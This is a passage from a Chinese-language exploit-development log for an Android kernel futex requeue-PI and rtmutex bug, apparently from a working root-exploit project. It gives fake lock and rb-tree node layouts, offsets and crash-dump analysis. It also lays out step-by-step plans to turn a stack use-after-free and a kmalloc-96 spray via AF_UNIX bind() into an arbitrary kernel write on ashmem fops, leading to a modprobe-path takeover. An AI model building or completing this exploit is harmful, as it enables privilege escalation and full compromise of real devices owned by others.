⇒ **结论：`W_waiter->lock = fake_lock` 这个涂栈是能落地的**
（否则根本造不出这个 BUG）。问题从来不是「涂不上」，而是
**「链走读 `waiter->lock` 的时机」与「涂栈的时机」错配**：
只要保证链走第一次读到的 `waiter->lock` 就是涂好的 `fake_lock`，
`BUG_ON` 就恒真、`W_waiter` 就只会被挂进我们自己的页，不会污染真锁。

### 12.4 另外三条核对结果（都影响设计）

1. **`rtmutex.c:455`：`top_waiter = orig_waiter`。**
   `rt_mutex_adjust_prio_chain()` 的第一轮迭代里 `top_waiter` 就是
   `orig_waiter`。`rt_mutex_adjust_pi()`（1126-1147）调用时
   `orig_waiter = NULL`，所以 **545 行的 `if (top_waiter)` 为假**，
   整块 `task_has_pi_waiters(task)` / `task_top_pi_waiter(task)`
   检查被跳过。这就是 Design-A 和 Design-G 都能活过 545 的原因，
   也是它们**必须**靠 569 行 `rt_mutex_waiter_equal` 才能被挡住的原因。

2. **`rtmutex.c:698` 是 `owner == 0` 的安全出口：**
   ```c
   if (!rt_mutex_owner(lock)) {
       if (prerequeue_top_waiter != rt_mutex_top_waiter(lock))
           wake_up_process(rt_mutex_top_waiter(lock)->task);
       raw_spin_unlock_irq(&lock->wait_lock);
       return 0;                     /* <== 685 的写已经落地，然后安全返回 */
   }
   ```
   ⇒ 把假锁的 `owner` 设成 0，就能让链走在 **685 完成写入之后、
   碰 711/723/724/725 那三处地雷之前** 干净退出。这是唯一
   「写已发生且不会 panic」的配置。
   （注意 `wake_up_process(W_waiter->task)` 用的是**涂过的** `task`：
   涂成 `init_task`（`IONSTACK_PSELECT_TASK=slide-init` 默认）时
   `try_to_wake_up()` 会因为 `p->state == TASK_RUNNING` 立刻返回 0，
   完全无副作用。）

3. **`rtmutex.c:664` 的 `rt_mutex_dequeue` 必须靠 `tree0` 涂对。**
   `RB_EMPTY_NODE(n)` = `n->__rb_parent_color == (unsigned long)n`，
   而我们不知道 `&W_waiter->tree_entry`，所以没法把槽位涂成
   「空节点」。只能用 `IONSTACK_PSELECT_TREE_MODE=page`
   （`t0 = fake_w0`，8 字节对齐 ⇒ `pc & 1 == 0` ⇒ `color = RB_RED`）
   让 `rb_erase` 走「无子节点 + 红」路径：不触发 `__rb_erase_color`
   再平衡，只做一次 `__rb_change_child(node, NULL, fake_w0, root)`
   ⇒ `*(fake_w0+0x10) = 0`，全部落在我们页内。**这是安全的**。
   （若 `t0 = 1`，`pc & 1 == 1` ⇒ `color = RB_BLACK` ⇒ 会进
   `__rb_erase_color`，`sibling = fake_w0->rb_left` 读到 0 再解引用
   ⇒ fault。所以 `page` 模式不是可选项，是必需项。）

### 12.5 完整的任意写构造（已核对，可直接实现）

假锁 `fake_lock` 在回收页里，布局（`src/exploit/util.c:2243-2527`
已经在写这些字段，`offset.h:127-156` 给的是偏移）：

```
fake_lock->waiters.rb_root.rb_node  @ fake_lock+0x10 = fake_w0
fake_lock->waiters.rb_leftmost      @ fake_lock+0x18 = fake_w0
fake_lock->owner                    @ fake_lock+0x20 = 0            (owner=none)
fake_w0->tree_entry.__rb_parent_color @ fake_w0+0x00 = 1 (BLACK)
fake_w0->tree_entry.rb_right        @ fake_w0+0x08 = 0
fake_w0->tree_entry.rb_left         @ fake_w0+0x10 = 0
fake_w0->task                       @ fake_w0+0x30 = init_task
fake_w0->lock                       @ fake_w0+0x38 = fake_lock      (BUG_ON 自洽)
fake_w0->prio                       @ fake_w0+0x40 = 130
```

链走（`rt_mutex_adjust_pi(W)` → `rt_mutex_adjust_prio_chain(W, MIN, NULL,
next_lock=fake_lock, NULL, W)`）逐门：

| 行 | 判定 | 结果 |
|---|---|---|
| 507 | `waiter = W->pi_blocked_on = &W_waiter` | 涂过的槽位 |
| 518 | 非空 | 过 |
| 525 | `orig_waiter == NULL` | 跳过 |
| 537 | `next_lock == waiter->lock == fake_lock` | 过 |
| 545 | `top_waiter == orig_waiter == NULL` | **整块跳过** |
| 569 | `130 != W->prio(121)` | 过（**这就是去 boost 的用处**） |
| 579 | `lock = fake_lock` | |
| 585 | `raw_spin_trylock(&fake_lock->wait_lock)` | `wait_lock_word = 0` ⇒ 成功 |
| 600 | `owner(0) != top_task(W)` | 过 |
| 661 | `prerequeue_top_waiter = fake_w0` | 非空，避开地雷 1 |
| 664 | `rt_mutex_dequeue(fake_lock, W_waiter)` | `tree0=fake_w0` ⇒ 空操作式安全擦除 |
| 682 | `waiter->prio = W->prio = 121` | |
| 685 | `rt_mutex_enqueue(fake_lock, W_waiter)` | `121 < 130` ⇒ 向左 ⇒ **`*(fake_w0+0x08) = &W_waiter->tree_entry`**；`rb_insert_color` 因 `fake_w0` 是 BLACK 立即 break；`*(fake_lock+0x18) = &W_waiter->tree_entry` |
| 698 | `owner == 0` | **安全返回 0** |

**要拿到真正的任意写，需要把 `fake_w0` 的 `__rb_parent_color` 涂成 RED
（`pc & 1 == 0`）并指向 `target-0x08`**，让 685 的
`rb_insert_color` 进修复循环：

```c
/* lib/rbtree.c: rb_insert_color() */
gparent = rb_red_parent(parent);        /* = parent->__rb_parent_color */
tmp = gparent->rb_right;
if (parent != tmp) {
    if (tmp && rb_is_red(tmp)) { ...recolor... }
    else {
        tmp = parent->rb_right;         /* = fake_w0->rb_right，我们控制 */
        if (node == tmp) { ...left-rotate... }
        WRITE_ONCE(gparent->rb_left, tmp);   /* <== 任意写：(target) = tmp */
        ...
    }
}
```

⇒ 设 `fake_w0->__rb_parent_color = target - 0x08`（RED，因为对齐 ⇒ 偶）、
`fake_w0->rb_right = <要写的值>`、`fake_w0->rb_left = 0`，
并保证 `*(target + 0x08)` 为 NULL 或 BLACK，则
**`*(target) = <要写的值>`**。
payload 里 `write_pc / write_right / write_left`
（`util.c:2269-2271, 2344-2381, 2465-2467`）就是为这条路准备的，
`IONSTACK_FOPS_PI_RB_SHAPE=ghostlock-right` 把
`write_pc` 设成 `data_addr(ASHMEM_MISC_FOPS) - 0x08`
（`util.c:2344-2353`）——即把写目标对准 `ashmem_misc.fops` 槽位。

### 12.6 下一步（精确、可执行）

1. **不要再给 `W_waiter->lock` 找别的涂法**——`lock` 已经能涂上
   （§12.3 的 BUG_ON 就是证据）。要做的是**把时机理顺**：
   在 Design-A（`IONSTACK_ROUTE_HOLD=0 IONSTACK_ROUTE_REARM=0`）下，
   `do_pselect_fake_lock_route()` 的 `IONSTACK_PSELECT_CONSUME_WHEN=post`
   路径（`fops.c:2898-2909`）在 `pselect()` 返回后、且 `paint_ok=1`
   时才 arm consumer，时序是对的；要保证**第一次**链走读到的
   `waiter->lock` 就是 `fake_lock`，即 consumer 不能在涂栈之前被 arm。
2. **用 `IONSTACK_T878U_ALLOW_OWNERLESS_PI=1` + `IONSTACK_FOPS_LOCK_OWNER_MODE=none`
   做一次安全验证**：这条配置下链走在 698 安全返回，**唯一的**
   失败模式就是 `BUG_ON(w->lock != lock)`（704 行）。
   ⇒ **活下来 = `lock` 涂对了**，这是零额外风险（不写真锁、不碰
   `init_task`、不触 723/724/725 三处地雷）的判决性实验。
3. 验证通过后，再切到 `ghostlock-right` + `fake_w0->__rb_parent_color
   = ASHMEM_MISC_FOPS - 0x08`（RED）+ `rb_right = fake_fops`
   去拿 `ashmem_misc.fops` 槽位的写，然后走既有的
   `try_cfi_stage()` / `configfs_write_once(binwrite_target, ...)`
   落 modprobe 路径。

   > ⚠️ **本条已被 §16.2 推翻（2026-10-03 晚）。** `ghostlock-right` 的
   > `child->__rb_parent_color = pc` 会把 `fake_fops->owner` 涂成
   > `ASHMEM_MISC_FOPS - 0x08` ⇒ `fops_get()` → `try_module_get()` 必败
   > （`module->refcnt @ +0x318` 落在 `abc_hub_driver.driver.acpi_match_table` = 0）
   > ⇒ `open("/dev/ashmem")` = `-ENODEV`。**改用 `IONSTACK_FOPS_PI_RB_SHAPE=target-left`。**
4. 观测手段的限制：`/dev/kmsg` 与 `dmesg` 在 `u:r:shell:s0`
   下都 `Permission denied`（本轮实测），所以
   `rtmutex.c:483` 的 `Maximum lock depth` printk **不能**当 oracle；
   `pstore` 也一直是 `PSTORE_EMPTY`。可用的 oracle 只有
   `/proc/<tid>/stat`（field 18，实测值 = `120 + nice - 100`）、
   `paint_ok`、以及「活下来 / 重启」这一位。

---

## 13. 第 13 轮（定论）：§5 / §12 的「涂栈能落地」是**错的**；真出路是「让 R 的 `pi_state_cache` 非空 ⇒ `kfree(P)`」

### 13.1 一句话

**pselect 涂栈从来没有到达过 `W_waiter`。** §12.3 用
`BUG_ON(w->lock != lock)` 反推「涂上了」的推理是**循环论证**，
已被 `scratch/panic/prev_dump_designj.log` 的内存 dump **逐字证伪**。
`PSELECT_GEOMETRY_FINDINGS.md` 的 §9（结构上不可行）才是对的。
**下一步不是继续调 pselect 时机，而是把 `pi_state` chunk 真正释放掉。**

### 13.2 证伪证据：designj dump 里 `waiter->lock` 是栈金丝雀，不是 `fake_lock`

`scratch/panic/prev_dump_designj.log:15720-15733`（逐字）：

```
X25: 0xffffff804170bc60:
bc60  00000001 00000000 cdf993a0 ffffffc0 09d03e80 ffffff80 00000000 00000000
bc80  00000004 ffffffc0 f0bd7100 54aa3097 4170bcf0 ffffff80 6614645d a7ceffa3
bca0  34214c40 ffffffc8 00000000 00000000 ffffffff 0000007f 34214cac ffffffc8
bcc0  34214c80 ffffffc8 04000202 00000000 00000080 00000000 ffffffff 00000000
bce0  34214c40 ffffffc8 34214c40 ffffffc8 4170be60 ffffff80 67d3a41d a7ceffa3
bd00  4170bec0 ffffff80 00000000 00000000 4170bd30 ffffff80 4ce30b1f 56fbdcba
bd20  306404dc 00000000 00000002 00000000 3b9a5c57 00000000 4170bdc8 ffffff80
bd40  34215800 ffffffc8 34215480 ffffffc8 34215490 ffffffc8 4cf824ef 56fbdcba
```

关键三点（`X25` 的 dump 基准 = `x25 - 0x80`，而 `x25 = W->pi_blocked_on`）：

1. **`x25 = 0xffffff804170bce0` = dump 基准 + 0x80 ⇒ `waiter` 就在 dump 偏移 `0x80`。**
   于是 `waiter->lock` = `*(waiter+0x38)` = `bd18` = **`0x56fbdcba4ce30b1f`**，
   与崩溃寄存器 `x0 = x3 = x21 = 56fbdcba4ce30b1f` **完全一致**。
2. **`0x56fbdcba4ce30b1f` 是栈金丝雀/SCS 值，不是 `fake_lock`
   （designj 的 `fake_lock = 0xffffffc0cdf984d0`）。**
   崩溃点是 `pc = _raw_spin_trylock+0x1c` / `lr = rt_mutex_adjust_prio_chain+0x2d4`
   ⇒ 就是 `rtmutex.c:585` 的 `raw_spin_trylock(&lock->wait_lock)`，
   `lock = waiter->lock` = 垃圾。**若涂栈成功，`wait_lock_word = 0` 会 trylock 成功，绝不会在这里 fault。**
3. `waiter` 的其余字段同样全是栈垃圾：`task@+0x30 = 0xffffff804170bd30`（栈指针，
   不是 `SLIDE_INIT_TASK`）、`prio@+0x40 = 0x00000000306404dc`（不是 130）、
   `tree_entry.__rb_parent_color@+0x00 = 0xffffffc834214c40`（不是 `fake_w0`）。
   **整块 waiter 被后续栈帧完全覆盖，一个涂过的字都没留下。**

### 13.3 §12.3 的推理为什么是错的

§12.3 说「`BUG_ON(waiter->lock != lock)` 恒真 ⇒ 能触发 BUG 就说明涂上了」。
但该 `BUG_ON` 在 `lock == waiter->lock` 时**恒不触发**——
而链走里 `lock` 就是 `waiter->lock`（rtmutex.c:579）。
所以「BUG 触发」只能说明 `rb_leftmost` 指向了一个 `lock` 字段**不等于 `lock`** 的节点；
把成因归给「pselect 涂了 `waiter->lock`」是**未经排除的假设**，
同一现象也能由「`lock` 本身就是垃圾」（= 13.2 的情形）产生。
**§12.3 的结论与 13.2 的 dump 直接冲突，以 dump 为准。**

### 13.4 为什么 pselect 涂栈在结构上不可能（复核 `PSELECT_GEOMETRY_FINDINGS.md` §9）

* `W_waiter` 的绝对位置由 **futex 侧**决定：`__arm64_sys_futex` 帧 `0x70` +
  `do_futex` 帧 `0x1e0`，`rt_waiter` 在 `do_futex_sp + 0xc0`
  ⇒ `waiter = SP0 - 0x190`（`SP0` = 内核栈顶固定偏移，与用户 SP 无关）。
* `stack_fds` 由 **select 侧**决定：`pselect6` 包装帧 `0xa0` + `core_sys_select` 帧 `0x1c0`，
  `stack_fds` 在帧内 `+0x50` ⇒ `stack_fds = SP0 - 0x210`。
* ⇒ **物理位移恒为 `0x80` = 16 词，不可调**（不是配置项；改 `shift` 只会把值涂到别的字上）。
* 6 个集合的切分：`in/out/ex` = 词 `[0,3·wps)`，`res_*` = 词 `[3·wps, 6·wps)`。
  waiter 在词 `16..25`，要落进用户可写区需 `3·wps ≥ 26` ⇒ `wps ≥ 9` ⇒ `n ≥ 513`
  ⇒ `size = 72 > sizeof(stack_fds)/6 = 42` ⇒ **走 `kvmalloc` 堆分配，与内核栈再无重叠**。
  `n = 320`（`wps = 5`）时用户区只有词 `0..14`——**差一个字**。
* 即便用 res-race 硬涂 `res_out[2..4]`，`do_select` 一置位就 `retval++` ⇒ 立即返回
  ⇒ `ret_to_user → do_notify_resume` 的 `0x1b0` 帧覆盖 `[SP0-0x1b0, SP0)`，
  而 waiter 在 `[SP0-0x190, SP0-0x140)` —— **被完整冲掉**。
* `IONSTACK_PSELECT_DIAG` 读回的是**用户态** `out[N]`（`set_fd_set` 从内核栈 `res_out` 拷回），
  它只证明 `do_select` 算对了位型，**完全不证明内核栈上的 waiter 还在**。
  所以 `paintcheck`（`IONSTACK_SKIP_CONSUME=1`）的「涂写完好」是**假阳性**。

**⇒ 「涂写要靠就绪，就绪就要返回，返回就冲掉」——闭环。pselect 路线彻底关闭。**

### 13.5 真出路：让 `put_pi_state(P)` 走 `kfree` 分支

§2 已经证明：**requeue 的错误路径确实会把 `P` 的 refcount 打到 0**
（`futex.c:2181` + `2198` 两次 `put_pi_state`），
此时走的是 `current->pi_state_cache` 分支 —— `current` = **执行 requeue 的 R**。

而 `put_pi_state`（`futex.c:847-885`）的分支是：

```c
	if (current->pi_state_cache) {
		kfree(pi_state);                     /* ← 我们要的 */
	} else {
		pi_state->owner = NULL;
		atomic_set(&pi_state->refcount, 1);
		current->pi_state_cache = pi_state;  /* ← 现状：chunk 留在 R 手里，不进 slab */
	}
```

⇒ **只要 requeue 发生时 `R->pi_state_cache` 非空，`P` 就被 `kfree`，
而 `W_waiter->lock = &P->pi_mutex` 立刻变成指向空闲 kmalloc-96 chunk 的悬垂指针。**
（`futex_requeue` 入口的 `refill_pi_state_cache()`（`futex.c:1969`）在缓存已非空时是 no-op，
不会覆盖我们预置的那块，所以预置能一路带到 requeue 的 `put_pi_state`。）

**如何预置 `R->pi_state_cache`：** 让 R 在 requeue **之前**做一次
「`FUTEX_LOCK_PI(f_pre)`（`f_pre` 的 futex word = 某个活着的 task tid）→ 阻塞 → 超时/EINTR
→ `unqueue_me_pi` → `put_pi_state`」。
`attach_to_pi_owner` 会 `alloc_pi_state()` 把 `refill_pi_state_cache` 刚分配的那块取走，
而超时路径的 `put_pi_state` 在缓存为空时把它**缓存回 R 自己**。
（这与 §6 B1 的机制同源，只是要把 B1 从「requeue 之后」挪到「requeue 之前」并加超时。）

### 13.6 释放之后：kmalloc-96 回收 + 假 `rt_mutex` 布局

`W_waiter->lock = P + 0x10`（`offsetof(struct futex_pi_state, pi_mutex) = 0x10`）。
回收后我们只需要控制 `P+0x10 .. P+0x38`：

```
P+0x10  wait_lock（16 字节）= 0                    ← raw_spin_trylock 成功
P+0x20  waiters.rb_root.rb_node = fake_w0          ← 非空，进 rt_mutex_enqueue 的下降循环
P+0x28  waiters.rb_leftmost    = 0                 ← 避开 rt_mutex_top_waiter 的 BUG_ON(w->lock != lock)
P+0x30  owner                  = 0                 ← rtmutex.c:698 安全出口（写已完成后再 return 0）
```

`owner = 0` 是 §12.4 第 2 点已经核对的**唯一「写已发生且不会 panic」**配置：
`[9] if (!rt_mutex_owner(lock)) return 0;` 在 `685` 的写之后。
`rb_leftmost = 0` 让 `prerequeue_top_waiter = NULL`，从而绕开 723/724 两处地雷。

`rt_mutex_dequeue(lock, waiter)`（`664`）**不会**踩雷：
requeue 里 `remove_waiter()` 已经执行过 `RB_CLEAR_NODE(&W_waiter->tree_entry)`，
所以 `RB_EMPTY_NODE()` 为真，`rt_mutex_dequeue` 立即 `return`。

任意写来自 `685` 的 `rb_insert_color`（`lib/rbtree.c`）：

```c
gparent = rb_red_parent(parent);        /* = fake_w0->__rb_parent_color */
tmp = gparent->rb_right;                /* 需为 NULL 或 BLACK */
if (parent != tmp) {
    if (tmp && rb_is_red(tmp)) { ...recolor...; continue; }
    tmp = parent->rb_right;             /* = fake_w0->rb_right，我们控制 */
    if (node == tmp) { ...left-rotate... }
    WRITE_ONCE(gparent->rb_left, tmp);  /* <== 任意写 */
    ...
}
```

⇒ 令 `fake_w0->__rb_parent_color = target - 0x10`（8 字节对齐 ⇒ 偶数 ⇒ RED）、
`fake_w0->rb_right = <值>`、`fake_w0->rb_left = 0`，并保证 `*(target - 8)` 为 NULL，
则 **`*(target) = <值>`**。
（`fake_w0` 住在已泄露的回收页里，地址已知；`target` 用
`IONSTACK_FOPS_PI_RB_SHAPE=ghostlock-right` 现有的 `data_addr(ASHMEM_MISC_FOPS) - 0x08` 那条线。）

> ⚠️ **形状名已作废（见 §16.2）。** 构型本身（`__rb_parent_color = T - 0x10`、
> `rb_right = 值`、`rb_left = 0`）是 `__rb_erase_augmented()` 的 **Case 1**，
> 它附带 `*(child) = pc`；当 `pc` 被钉死成 `data_addr(ASHMEM_MISC_FOPS) - 0x08`
> 时就会毁掉 `fake_fops->owner`。**改走 Case 1 变体（`rb_right = child`、`rb_left = 0`），
> 即 `IONSTACK_FOPS_PI_RB_SHAPE=target-left`。**

### 13.7 回收原语（本轮选定）：`bind()` on `AF_UNIX` 抽象地址

`unix_bind()` → `kmalloc(sizeof(struct unix_address) + addr_len)`，
`struct unix_address { refcount_t refcnt; int len; struct sockaddr_un name[0]; }`
⇒ 受控字节从 `chunk+0x08` 开始（`name[]` 是用户 `sockaddr_un` 的原样拷贝）。

* 取 `addr_len = 88` ⇒ `8 + 88 = 96` ⇒ **kmalloc-96**；
* `chunk+0x08..0x60` 全部用户可控 ⇒ `P+0x10..0x38` 覆盖在内；
* 抽象命名空间名可任意变化 ⇒ 可喷射任意多块；
* 生命周期 = socket 存活期，**不瞬态**（比 `setxattr` / `sendmsg` 的 `ctl_buf` 可靠）；
* 无需特权（`u:r:shell:s0` 下可用）。

**注意 `msg_msg` 不可用**：`struct msg_msg` 头部占 `0x30`，
`+0x20` 是 `next`（内核置 NULL）⇒ 拿不到 `rb_node = fake_w0`，只能得到空树、退化为无写。

### 13.8 下一步（精确、可执行）

1. **关闭 pselect 路线**：不要再跑涂栈分支，也不要再动 `IONSTACK_PSELECT_*`。
   保留 `IONSTACK_ROUTE_HOLD=1`（W 一直阻塞）。
2. **把预置 `pi_state_cache` 加到 requeue 之前**（§13.5），新增
   `IONSTACK_PREFILL_PI_CACHE=1`，用一个带短超时（≤300 ms）的
   `FUTEX_LOCK_PI(f_pre)` 完成。
3. **requeue 之后**（顺序：M 先 park 在 `f_pi_chain` → requeue → M 超时 de-boost）
   立刻做 `bind()` 喷射（§13.7），把 `P+0x10` 写成 §13.6 的假锁。
4. **然后**才让 consumer 发 `sched_setattr(W_tid, nice=1)`。
   **判定 oracle**：`rtmutex.c:698` 的安全出口 ⇒ 进程存活、无 oops、
   `walk_reached_725` **不**应再为 1（因为 owner=0 提前返回了），
   而 `/proc/<helper>/stat` 第 18 字段应保持 `39`（不再被 adjust）。
   若改用 `ghostlock-right`（RED + `target`），则观察目标槽位是否被改写。
5. **仍然要记住的硬约束**：`ROUTE_WAIT_SECONDS = 8`（W 的
   `FUTEX_WAIT_REQUEUE_PI` 超时）——步骤 3/4 必须在 8 s 内完成。

### 13.9 本轮新增/修正的结论汇总

| # | 旧结论 | 新结论（证据） |
|---|---|---|
| 1 | §5「pselect 涂栈路线不可行被推翻」 | **错。不可行成立。** designj dump 逐字证伪（§13.2） |
| 2 | §12.3「`BUG_ON` 证明涂栈能落地」 | **循环论证。** `BUG_ON` 在 `lock == waiter->lock` 时恒不触发（§13.3） |
| 3 | §12.6「不要再给 `W_waiter->lock` 找别的涂法」 | **错。涂栈就是没涂上**；必须让 `waiter->lock` 指向被回收的 chunk（§13.5） |
| 4 | §6 B4「refcount 归不了零 ⇒ 无法 `kfree`」 | **只在「`f_pi_target` 上已有 waiter X」那种构型下成立。** 本工程实际构型（无 X）下 refcount 确实归零，**只差 `R->pi_state_cache` 非空这一个条件**（§13.5） |
| 5 | `paintcheck`「涂写完好」 | **假阳性**：读回的是用户态 `out[]`，与内核栈无关（§13.4） |

---

## 14. 第 14 轮（定论）：§13.5 的 prefill 修复也是错的；真正的原语是「让 W 超时返回 ⇒ `W->pi_blocked_on` 变成对 W 自己内核栈的 UAF」

> 本轮全部结论都建立在**逐行读源码 + 逐字节反汇编 `firmware_extract/ap/boot_kernel.bin.elf`** 之上。
> 没有跑设备（`boot_id` 保持 `20c8f935-8963-4ad6-a0fb-e42bc34fac7c`，零重启）。

### 14.1 一句话

§13.5 提出的「预置 `R->pi_state_cache` ⇒ `put_pi_state(P)` 走 `kfree`」**在结构上不可能生效**——
`futex_requeue()` 在走到那个 `put_pi_state()` **之前**就已经把 `R->pi_state_cache` 抽空了。
`P` 在整条 requeue 路径上**永远不会被 `kfree`**。

而 §13.6/§13.7 依赖的「回收 `P`」因此整条路走不通。**但**本轮同时发现了一条更干净、
不需要 `kfree` 任何东西、也不需要 rearm 的路：**`W->pi_blocked_on` 在 W 从 futex 超时返回后依然
指向 W 自己已经作废的内核栈帧**——这是一个**真正的 UAF**，而那个位置（`SP0-0x190`）
可以被 W **随后任意一个"用户数据 → 内核栈"的阻塞型 syscall 重新涂写**。

### 14.2 §13.5 的 prefill 为什么必然无效（源码级证明）

`futex_requeue()`（`kernel/futex.c:1934`）在 requeue_pi 分支里的真实调用链是：

```
1934 futex_requeue(...)
1969   refill_pi_state_cache()          /* R->pi_state_cache 为 NULL 时 kzalloc 一个新 chunk C */
       ...
2043   futex_proxy_trylock_atomic(uaddr2, hb1, hb2, &key1, &key2, &pi_state, nr_requeue)
1891     top_waiter = futex_top_waiter(hb1, key1);      /* f_wait 上的 W —— 一定有 */
1907     futex_lock_pi_atomic(pifutex, hb2, key2, ps, top_waiter->task = W, set_waiters = nr_requeue)
1427       newval = uval | FUTEX_WAITERS;  lock_pi_update_atomic(...)   /* 给 f_pi_target 置 WAITERS 位 */
1436       attach_to_pi_owner(uaddr, newval, key, ps)
1282         pi_state = alloc_pi_state();   /* <<< current->pi_state_cache = NULL，抽空！ */
1288         rt_mutex_init_proxy_locked(&pi_state->pi_mutex, p = M);
1294         list_add(&pi_state->list, &M->pi_state_list);
1299         pi_state->owner = p;
       /* 回到 2043：*ps = P，R 拿到 P 的一个引用 */
       ...
2107   plist_for_each_entry_safe(this, next, &hb1->chain, list)   /* 遍历 f_wait 上的 waiter（W） */
2154     get_pi_state(pi_state);            /* refcount 1 -> 2 */
2155     this->pi_state = pi_state;
2156     rt_mutex_start_proxy_lock(&pi_state->pi_mutex, this->rt_waiter /* = W_waiter */, this->task /* = W */)
1803       raw_spin_lock_irq(&lock->wait_lock);
1804       ret = __rt_mutex_start_proxy_lock(...)    /* 返回 -EDEADLK */
1806       if (unlikely(ret)) remove_waiter(lock, waiter);   /* <<< BUG 在这里触发 */
1807       raw_spin_unlock_irq(&lock->wait_lock);
2171     } else if (ret) { this->pi_state = NULL; put_pi_state(pi_state); break; }   /* 2181: refcount 2 -> 1 */
2198   put_pi_state(pi_state);              /* refcount 1 -> 0 */
```

`put_pi_state()`（`futex.c:847`）的关键分支：

```c
852	if (!atomic_dec_and_test(&pi_state->refcount)) return;
859	if (pi_state->owner) { ... rt_mutex_proxy_unlock(&pi_state->pi_mutex, owner); ... }   /* pi_mutex.owner = 0 */
873	if (current->pi_state_cache) { kfree(pi_state); }
874	else { pi_state->owner = NULL; atomic_set(&pi_state->refcount, 1);
883	       current->pi_state_cache = pi_state; }        /* <<< 实际走这里 */
```

**结论（硬）：** `alloc_pi_state()`（`futex.c:828`）只有一句 `current->pi_state_cache = NULL;`。
它在 **2043**（早于 2198）就已经执行。而 2043→2198 之间**没有任何** `alloc_pi_state()`
也没有任何其它 `put_pi_state()`。所以到 2198 时 `R->pi_state_cache` **必然是 NULL** ⇒ 走 883 的
缓存分支 ⇒ **`P` 永远进不了 slab**。**在 requeue 之前把 cache 预置成非空，只会改变「哪一个 chunk
变成 P」，不会改变 2198 走哪个分支。** §13.5 作废。

### 14.3 `pi_state_cache` 唯一的释放点：`do_exit`（本构型下用不上）

`grep pi_state_cache` 的全部命中：

| 位置 | 作用 |
|---|---|
| `futex.c:805/809/823` | `refill_pi_state_cache()`：cache 非空则 no-op，否则 `kzalloc` |
| `futex.c:830/833` | `alloc_pi_state()`：取出并**清空** cache |
| `futex.c:873/883` | `put_pi_state()`：cache 非空 ⇒ `kfree`；否则回填 cache |
| `futex.c:1969` | `futex_requeue()` 入口 |
| `futex.c:2830` | `futex_lock_pi()` 入口 |
| `include/linux/sched.h:1277` | 字段定义 |
| `kernel/fork.c:2183` | `p->pi_state_cache = NULL;` |
| **`kernel/exit.c:913-914`** | **`if (unlikely(current->pi_state_cache)) kfree(current->pi_state_cache);`（在 `do_exit()` 里，位于 `exit_notify()` 之后）** |

**⇒ 唯一能真正 `kfree(P)` 的方式是「持有 P 的那个 task 退出」。**
也就是「让 requeue 任务 R 退出」。这条**可行但代价大**：R 退出后就不能再执行 rearm
（rearm 的 `alloc_pi_state()` 正是要把 P 拿回来），于是 `P->pi_mutex.owner` 只能靠我们自己的
伪造数据来设——而这就要求回收 `P`，又回到「需要一个能从 +0x00 起完全可控的 kmalloc-96 对象」，
而本轮已经把候选全部否掉（见 §14.9）。**所以 §13.6/§13.7 的整条「回收 P」路线放弃。**

### 14.4 关键新结论：`walk_reached_725=1` 恰恰意味着「一个字节都没写」

这一条解释了本工程此前所有「已经走到 725」的运行（designg/g2/h）为什么既没崩、也没拿到写。

`rt_mutex_adjust_pi()`（`rtmutex.c:1126`）调用的实参是：

```c
rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, /*orig_lock=*/NULL,
                           /*next_lock=*/next_lock,      /*orig_waiter=*/NULL, /*top_task=*/task);
```

对照真实签名（`rtmutex.c:448-453`，本轮逐行核对）：

```c
static int rt_mutex_adjust_prio_chain(struct task_struct *task,
                                      enum rtmutex_chainwalk chwalk,
                                      struct rt_mutex *orig_lock,      /* = NULL  */
                                      struct rt_mutex *next_lock,
                                      struct rt_mutex_waiter *orig_waiter,  /* = NULL */
                                      struct task_struct *top_task)
{
    struct rt_mutex_waiter *waiter, *top_waiter = orig_waiter;   /* top_waiter = NULL */
```

于是：

* `545 if (top_waiter) { ... }` —— **`top_waiter == NULL`，整块跳过**。
  即 `task_has_pi_waiters()` / `task_top_pi_waiter()` 两道门**根本不执行**。
* `600 if (lock == orig_lock || rt_mutex_owner(lock) == top_task)` ——
  `orig_lock == NULL` ⇒ 第一个析取项**恒为假**；第二项要求 `rt_mutex_owner(lock) == W`。
  ⇒ 只要 owner 不是 W，600 **必然通过**。（这正是 rearm 路线能活着走到 725 的原因。）

然后到写点：

* `661 prerequeue_top_waiter = rt_mutex_top_waiter(lock);` → `rb_first_cached(&lock->waiters)`
  就是 `lock->waiters.rb_leftmost`。**rearm 之后这棵树里只有 R 自己的 `rt_waiter` 一个节点**，
  它是根 ⇒ `rb_insert_color()` 在它入树时执行了 `rb_set_parent_color(node, NULL, RB_BLACK)`，
  把 `__rb_parent_color` 写成 **1（BLACK）**。
* `664 rt_mutex_dequeue(lock, waiter);` → `RB_EMPTY_NODE(&W_waiter->tree_entry)` 为真
  （`remove_waiter()` 已 `RB_CLEAR_NODE`），**空操作**。
* `682 waiter->prio = task->prio;`
* `685 rt_mutex_enqueue(lock, waiter);` → 下降比较 `rt_mutex_waiter_less(W_waiter(121), R_rt_waiter(125))`
  为真 ⇒ 走左边 ⇒ `rb_link_node(&W_waiter->tree_entry, &R_rt_waiter->tree_entry, &...rb_left)`
  ⇒ `rb_insert_color_cached(&W_waiter->tree_entry, &lock->waiters, leftmost = true)`
  ⇒ 设 `rb_leftmost = &W_waiter->tree_entry`，然后 `rb_insert_color()`：

```c
	parent = rb_red_parent(node);            /* = &R_rt_waiter->tree_entry */
	if (unlikely(!parent)) { ...; break; }
	if (rb_is_black(parent)) break;          /* <<< 这里直接 break：__rb_parent_color == 1 */
	gparent = rb_red_parent(parent);
	tmp = gparent->rb_right;
	...
	WRITE_ONCE(gparent->rb_left, tmp);       /* <<< 唯一的任意写，到不了 */
```

**⇒ `rb_insert_color()` 只在「被插入节点的父节点是 RED」时才写内存。**
单节点树的根是 BLACK ⇒ **立刻 break ⇒ 零写**。
所以 `rtmutex.c:685` 执行了、`716` 判真、`723/724/725` 执行了（`rt_mutex_adjust_prio(helper)`
把 helper 的 prio 压到 121，这就是 `post == w_after` 的来历），**但一个字节都没写出去**。

**这条把「走到了 725」从「成功指标」降级为「无写指标」。** §11/§12 把它当成进展是误读。

### 14.5 写原语的精确条件（`lib/rbtree.c: __rb_insert`）

要在 `rt_mutex_enqueue()` 里拿到任意写，必须让 `parent` 是 RED 且 `gparent` 指向**我们控制的内存**：

```c
	parent = rb_red_parent(node);                 /* node->__rb_parent_color & ~3 */
	if (rb_is_black(parent)) break;               /* 必须 parent RED（__rb_parent_color 为偶数） */
	gparent = rb_red_parent(parent);              /* parent->__rb_parent_color & ~3  <== 我们要控制 */
	tmp = gparent->rb_right;                      /* gparent+0x08 */
	if (parent != tmp) {                          /* 走 rb_left 分支 */
		if (tmp && rb_is_red(tmp)) { ...; continue; }
